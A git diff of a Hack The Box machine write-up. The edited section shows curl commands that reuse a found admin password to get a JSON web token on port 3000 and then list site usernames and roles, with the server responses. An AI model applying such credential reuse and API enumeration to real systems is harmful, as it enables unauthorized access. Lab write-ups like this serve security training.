@@ -185,40 +185,22 @@ mysqli($dbHost, $dbUsername, $dbPassword,$db) or die("Connect failed: %s\n". $co
 
 ### curl
 
-On the htb forums it mentioned this article: [Using cURL to authenticate with JWT Bearer tokens](https://medium.com/@nieldw/using-curl-to-authenticate-with-jwt-bearer-tokens-55b7fac506bd). This info was invaluable in helping me to understand how to auth on port 3000. It was also in the forums that I found out the database username `root` was not the username that gained access. It was another often used administrator username. 
+On the htb forums it mentioned this article: [Using cURL to authenticate with JWT Bearer tokens](https://medium.com/@nieldw/using-curl-to-authenticate-with-jwt-bearer-tokens-55b7fac506bd). This info was invaluable in helping me to understand how to auth on port 3000. It was also in the forums that I found out the database username `root` was not the username that gained access. It was another oft-used administrator username. 
 
-I played around with curl for a while against the four login points with various usernames. I tried the `login.php` page and eventually got a Authorization header of interest:
-
-```
-curl -v -u admin:Zk6heYCyv6ZE9Xcg http://10.10.10.137:80/login.php
-
-* Expire in 0 ms for 6 (transfer 0x55bcd130ec40)
-* Trying 10.10.10.137...
-* TCP_NODELAY set
-* Expire in 200 ms for 4 (transfer 0x55bcd130ec40)
-* Connected to 10.10.10.137 (10.10.10.137) port 80 (#0)
-* Server auth using Basic with user 'admin'
-> GET /login.php HTTP/1.1
-> Host: 10.10.10.137
-> Authorization: Basic YWRtaW46Wms2aGVZQ3l2NlpFOVhjZw==
-> User-Agent: curl/7.64.0
-> Accept: */*
-```
-
-The basic authorization value seen in the above GET request turns out to be `admin:Zk6heYCyv6ZE9Xcg` base64 encoded. Okay. Let's send that to the login on port 3000 and see what we get. After trying many different things, the below curl command   
+Entering the following curl
 
 ```
 curl -H 'Accept: application/json' -H 'Content-Type: application/json' H "Authorization: Basic
 YWRtaW46Wms2aGVZQ3l2NlpFOVhjZw==" --data '{"username":"admin","password":"Zk6heYCyv6ZE9Xcg"}' http://
 10.10.10.137:3000/login
 ```
-returns
+on the command line returns
 
 ```
 {"success":true,"message":"Authentication
 successful!","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYzNzQzNDUwLCJleHAiOjE1NjM4Mjk4rzehjxRxuFsFSjw9Wb67LvvY"}
 ```
-We now have a JWT Auth token! Let's use it against port 3000:
+We now have a [JSON web token](https://jwt.io/introduction/)! Let's use it on port 3000:
 
 ```
 curl -H 'Accept: application/json' -H "Authorization: Bearer
@@ -235,7 +217,7 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYzNzU
 [{"ID":"1","name":"Admin","Role":"Superuser"},{"ID":"2","name":"Derry","Role":"Web Admin"}, {"ID":"3","name":"Yuri","Role":"Beta Tester"},{"ID":"4","name":"Dory","Role":"Supporter"}]
 ```
 
-We get four more usernames, including Derry, who wrote the note that we found via anonymous ftp.
+We get four more usernames, including Derry, who wrote the note that we found via anonymous ftp. No passwords though.
 
 ### I Should have dirb-ed more...
 
